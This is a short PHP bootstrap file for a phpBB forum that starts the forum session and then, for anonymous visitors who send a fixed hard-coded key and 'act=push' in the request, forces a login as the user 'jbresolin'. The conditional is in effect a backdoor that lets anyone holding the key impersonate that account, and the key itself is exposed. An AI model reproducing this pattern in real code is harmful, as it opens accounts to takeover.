<?php

use Baja\Session;

define('IN_PHPBB', true);
define('ROOT_PATH', __DIR__ . "/../forum");

if (!defined('IN_PHPBB') || !defined('ROOT_PATH')) {
exit();
}

$phpEx = "php";
$phpbb_root_path = (defined('PHPBB_ROOT_PATH')) ? PHPBB_ROOT_PATH : ROOT_PATH . '/';
include($phpbb_root_path . 'common.' . $phpEx);

$user->session_begin();
$auth->acl($user->data);
$request->enable_super_globals();

if ($user->data['username'] == "Anonymous" && $_REQUEST['api'] === 's45gh$3d56' && $_REQUEST['act'] === 'push') {
    Session::setForcedSession('jbresolin');
}
session_start();